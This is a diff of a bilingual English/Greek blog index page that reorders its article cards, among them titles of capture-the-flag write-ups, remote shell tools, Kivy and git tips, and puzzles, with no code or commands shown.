-      <h3 class="title" lang="en">WinRM shell (a.k.a. PowerShell Remoting) with file upload capability</h3>
-      <h3 class="title" lang="el">WinRM κέλυφος (PowerShell Remoting) με δυνατότητα ανεβάσματος αρχείων</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">09 Apr 2018</time>
-      <time lang="el">09 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/kivy_popup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/kivy.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">How to build a responsive popup window with scrolling capability in Kivy</h3>
-      <h3 class="title" lang="el">Πως να φτιάξετε ένα ευέλικτο αναδυόμενο παράθυρο με δυνατότητα κύλισης στην Kivy</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">19 Feb 2014</time>
-      <time lang="el">19 Φεβ 2014</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/path_traversal_archiver/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/path.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Path-traversal archiver</h3>
-      <h3 class="title" lang="el">Αρχειοθέτης με διάσχιση διαδρομής</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">14 May 2019</time>
-      <time lang="el">14 Μαϊ 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/mantis_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/mantis.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Mantis write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Mantis</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">18 Feb 2018</time>
-      <time lang="el">18 Φεβ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/falafel_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/falafel.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Falafel write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Falafel</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">23 Jun 2018</time>
-      <time lang="el">23 Ιουν 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
            
            
            
@@ -1337,740 +736,19 @@ if (language) {
            
            
            
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Reddish write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Reddish</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">26 Jan 2019</time>
-      <time lang="el">26 Ιαν 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/sense_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/pfsense.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Sense write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Sense</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">24 Mar 2018</time>
-      <time lang="el">24 Μαρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/node_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/jscode.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Node write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Node</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">03 Mar 2018</time>
-      <time lang="el">03 Μαρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fulcrum_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/fulcrum.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Fulcrum write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Fulcrum</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">09 Jun 2018</time>
-      <time lang="el">09 Ιουν 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/nl80211/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/wifi-sign.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">How to get info for the wireless interface using nl80211 in C</h3>
-      <h3 class="title" lang="el">Πως να λάβετε πληροφορίες για την ασύρματη διεπαφή χρησιμοποιώντας την nl80211 στη C</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">09 Oct 2016</time>
-      <time lang="el">09 Οκτ 2016</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fluxcapacitor_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/capacitors.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">FluxCapacitor write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του FluxCapacitor</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">13 May 2018</time>
-      <time lang="el">13 Μαϊ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/nineveh_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/nineveh.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Nineveh write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Nineveh</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">17 Dec 2017</time>
-      <time lang="el">17 Δεκ 2017</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/inception_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/mirror.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Inception write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Inception</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">14 Apr 2018</time>
-      <time lang="el">14 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Optimum write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">28 Oct 2017</time>
-      <time lang="el">28 Οκτ 2017</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
           
            
            
            
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Legacy write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Legacy</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">19 Oct 2017</time>
-      <time lang="el">19 Οκτ 2017</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
           
            
            
            
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
           
-           
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/tally_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/dart.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Tally write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Tally</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">03 May 2018</time>
-      <time lang="el">03 Μαϊ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
           
-           
            
            
            
@@ -2078,14 +756,11 @@ if (language) {
            
            
            
-           
           
            
            
            
-           
           
-           
            
            
            
@@ -2109,6 +784,1150 @@ if (language) {
            
            
            
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Legacy write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Legacy</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">19 Oct 2017</time>
+      <time lang="el">19 Οκτ 2017</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/mssql_shell/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/dbs.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">MSSQL shell with file upload capability</h3>
+      <h3 class="title" lang="el">MSSQL κέλυφος με δυνατότητα ανεβάσματος αρχείων</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">13 Apr 2018</time>
+      <time lang="el">13 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/rold/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/rold.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Retriever of Lost Dreams</h3>
+      <h3 class="title" lang="el">Ο Ιχνηλάτης των Χαμένων Ονείρων</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">16 Aug 2015</time>
+      <time lang="el">16 Αυγ 2015</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Optimum write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">28 Oct 2017</time>
+      <time lang="el">28 Οκτ 2017</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/tally_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/dart.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Tally write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Tally</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">03 May 2018</time>
+      <time lang="el">03 Μαϊ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/sense_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/pfsense.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Sense write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Sense</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">24 Mar 2018</time>
+      <time lang="el">24 Μαρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fulcrum_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/fulcrum.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Fulcrum write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Fulcrum</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">09 Jun 2018</time>
+      <time lang="el">09 Ιουν 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/inception_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/mirror.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Inception write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Inception</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">14 Apr 2018</time>
+      <time lang="el">14 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fluxcapacitor_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/capacitors.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">FluxCapacitor write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του FluxCapacitor</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">13 May 2018</time>
+      <time lang="el">13 Μαϊ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/mantis_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/mantis.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Mantis write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Mantis</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">18 Feb 2018</time>
+      <time lang="el">18 Φεβ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/nineveh_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/nineveh.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Nineveh write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Nineveh</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">17 Dec 2017</time>
+      <time lang="el">17 Δεκ 2017</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Reddish write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Reddish</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">26 Jan 2019</time>
+      <time lang="el">26 Ιαν 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/node_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/jscode.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Node write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Node</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">03 Mar 2018</time>
+      <time lang="el">03 Μαρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/matchsticks/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/matchsticks.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Alamot&#39;s matchstick puzzles</h3>
+      <h3 class="title" lang="el">Σπιρτοσπαζοκεφαλιές</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">11 Mar 2014</time>
+      <time lang="el">11 Μαρ 2014</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/falafel_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/falafel.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Falafel write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Falafel</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">23 Jun 2018</time>
+      <time lang="el">23 Ιουν 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/winrm_shell/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/winrm.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">WinRM shell (a.k.a. PowerShell Remoting) with file upload capability</h3>
+      <h3 class="title" lang="el">WinRM κέλυφος (PowerShell Remoting) με δυνατότητα ανεβάσματος αρχείων</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">09 Apr 2018</time>
+      <time lang="el">09 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
            
           
            
@@ -2136,16 +1955,16 @@ if (language) {
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fast_commit_push/" class="clearfix">
+  <a href="https://alamot.github.io/oracle/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/binary_flow.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/oracle.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Git &amp; Mercurial: How to commit-push fast and easily</h3>
-      <h3 class="title" lang="el">Git &amp; Mercurial: Πως να κάνετε commit-push γρήγορα και εύκολα</h3>
+      <h3 class="title" lang="en">Ask and you shall receive</h3>
+      <h3 class="title" lang="el">Ζήτα και θα λάβεις</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">17 Oct 2016</time>
-      <time lang="el">17 Οκτ 2016</time>
+      <time lang="en">04 May 2019</time>
+      <time lang="el">04 Μαϊ 2019</time>
     </footer>
   </a>
 </article>
@@ -2170,6 +1989,399 @@ if (language) {
            
            
            
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/path_traversal_archiver/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/path.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Path-traversal archiver</h3>
+      <h3 class="title" lang="el">Αρχειοθέτης με διάσχιση διαδρομής</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">14 May 2019</time>
+      <time lang="el">14 Μαϊ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
